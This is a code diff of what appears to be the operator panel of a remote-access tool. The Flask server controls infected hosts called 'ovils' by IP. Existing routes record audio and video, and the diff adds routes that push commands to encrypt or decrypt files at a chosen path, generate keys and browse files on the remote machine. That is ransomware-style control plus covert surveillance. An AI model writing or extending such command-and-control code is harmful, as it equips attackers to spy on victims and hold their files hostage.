@@ -40,14 +40,17 @@ def handle_errors(func: Callable[..., str]) -> Callable[..., str]:
     return inner
 
 
+def handle_disconnection(func: Callable) -> Callable:
+    def inner(ip, *arg, **kargs):
+        if ip not in ovils:
+            return "This ovil is disconnected! Connect and try again"
+        return func(ip, *arg, **kargs)
+    inner.__name__ = func.__name__
+    return inner
+
+
 def is_connected(ip: str) -> bool:
     return ip in [ovil.ip for ovil in ovils]
-
-
-@app.route('/')
-@handle_errors
-def hello_world():
-    return render_template("index.html", ovils=[ovil.ip for ovil in ovils])
 
 
 @app.route('/ovil/<ip>/connect/')
@@ -283,10 +286,9 @@ def stop_video_audio(ip):
     # return redirect(url_for("/ovil/<ip>/video_audio_record/"))
 
 
-
-def generate_time_stamp(time: datetime = None):
-    time = time if time else datetime.now()
-    return time.strftime("%d.%m.%Y_%H;%M;%S")
+def generate_time_stamp(t: datetime = None):
+    t = t if t else datetime.now()
+    return t.strftime("%d.%m.%Y_%H;%M;%S")
 
 
 @app.route("/ovil/<ip>/video_audio_record/VideoStop")
@@ -305,6 +307,7 @@ def stop_video(ip):
 
 @app.route("/ovil/<ip>/video_audio_record/AudioStop")
 @handle_errors
+@handle_disconnection
 def stop_audio(ip):
     r = start_stop_command(ip, "stop_audio_record", [], "Stop")
     if r != "Stoped successfully!":
@@ -419,6 +422,83 @@ def convert_to_mp3(wav_file: Path) -> Path:
     os.remove(wav_file)
 
     return Path(with_mp3)
+
+
+@app.route("/ovil/<ip>/encryption/")
+@handle_errors
+def encryption(ip):
+    return render_template("encryption.html")
+
+
+@app.route("/ovil/<ip>/encryption/GenerateKey/")
+@handle_errors
+@handle_disconnection
+def generate_key(ip):
+    ovil = ovils[ovils.index(ip)]
+    key = ovil.send_command("generate_key", [])
+    return key
+
+
+def failed_succ_to_msg(result: str, method: str, key: str) -> str:
+    try:
+        lists = result.replace("\\\\", "\\")[2:-2].split("], [")
+        succ, failed = lists[0].split(", "), lists[1].split(", ")
+    except (IndexError, ValueError):
+        return result
+    msg = f"{method}ion with the key - '{key}': \n\n"
+    msg += f"\tsucceeded to {method}: \n"
+    for file in succ:
+        file = file.strip()
+        if file:
+            msg += f"\t\t{file} \n"
+    msg += "\n"
+    msg += f"\tfailed to {method}: \n"
+    for file in failed:
+        file = file.strip()
+        if file:
+            msg += f"\t\t{file} \n"
+    msg += "\n\n"
+    return msg
+
+
+@app.route("/ovil/<ip>/encryption/encrypt/")
+@handle_errors
+@handle_disconnection
+def encrypt(ip):
+    key = request.args.get("key")
+    path = request.args.get("path")
+    ovil = ovils[ovils.index(ip)]
+    if not key or key == "default":
+        key = ovil.send_command("encryption_key", [])
+    if not path:
+        return "Invalid path"
+    result = ovil.send_command("encrypt", [path, key])
+    return failed_succ_to_msg(result, 'encrypt', key)
+
+
+@app.route("/ovil/<ip>/encryption/decrypt/")
+@handle_errors
+@handle_disconnection
+def decrypt(ip):
+    key = request.args.get("key")
+    path = request.args.get("path")
+    ovil = ovils[ovils.index(ip)]
+    if key == "default":
+        key = ovil.send_command("encryption_key", [])
+    result = ovil.send_command("decrypt", [path, key])
+    if not path:
+        return "Invalid path"
+    return failed_succ_to_msg(result, "decrypt", key)
+
+
+@app.route("/ovil/<ip>/<page>/files/")
+@handle_errors
+@handle_disconnection
+def show_files(ip, page):
+    path = request.args.get("path")
+    ovil = ovils[ovils.index(ip)]
+    result = ovil.send_command("show_files", [path])
+    return result.replace(",", "\n")
 
 
 def main():
